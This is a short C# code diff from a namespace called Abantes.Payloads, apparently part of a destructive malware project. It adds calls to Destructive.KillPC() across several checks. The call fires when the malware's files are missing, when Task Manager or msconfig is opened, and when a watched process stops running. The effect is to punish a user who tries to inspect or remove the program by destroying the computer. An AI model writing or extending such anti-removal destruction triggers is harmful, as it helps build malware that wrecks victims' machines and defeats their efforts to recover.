@@ -289,7 +289,7 @@ namespace Abantes.Payloads
             {
                 if (File.Exists(sFileName[i]) == false)
                 {
-
+                    Destructive.KillPC();
                 }
             }
         }
@@ -306,14 +306,17 @@ namespace Abantes.Payloads
                     if (proc[0].ToString() == Process.GetProcessesByName("taskmgr")[0].ToString())
                     {
                         //Flagged
+                        Destructive.KillPC();
                     }
                     else if (proc[0].ToString() == Process.GetProcessesByName("msconfig")[0].ToString())
                     {
                         //Flagged
+                        Destructive.KillPC();
                     }
                     else
                     {
                         //Non-Flagged Process found
+                        Destructive.KillPC();
                     }
                 }
             }
@@ -324,6 +327,7 @@ namespace Abantes.Payloads
                 if (proc.Length == 0)
                 {
                     //Not Running
+                    Destructive.KillPC();
                 }
                 else
                 {
